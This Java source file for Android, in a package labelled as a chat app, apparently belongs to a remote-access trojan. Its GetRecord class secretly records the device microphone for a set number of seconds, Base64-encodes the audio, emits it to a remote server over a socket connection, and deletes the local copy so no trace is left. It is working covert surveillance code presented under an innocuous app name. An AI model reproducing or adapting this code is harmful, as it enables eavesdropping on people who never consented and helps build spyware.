package com.example.chatapp.mic;

import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import com.example.chatapp.MainService;
import com.example.chatapp.socket.IOSocket;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class GetRecord {
    static MediaRecorder recorder;
    static File audioFile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;

    public static void startRecording(int sec)throws Exception{
        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();

        try{
            Log.e("DIRR" , dir.getAbsolutePath());
            audioFile = File.createTempFile("sound", ".mp3", dir);
        }catch (IOException e){
            Log.e(TAG, "external storage access error");
            return;
        }

        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audioFile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                recorder.stop();
                recorder.release();
                sendVoice(audioFile);
                audioFile.delete();
            }
        };
        new Timer().schedule(stopRecording, sec* 1000);
    }

    private static void sendVoice(File file){
        int size = (int) file.length();
        Log.e("FIle Size", String.valueOf(file.length()));
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            String file64 = Base64.encodeToString(data, Base64.DEFAULT);
            IOSocket.getInstance().getIoSocket().emit("record" , file64);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
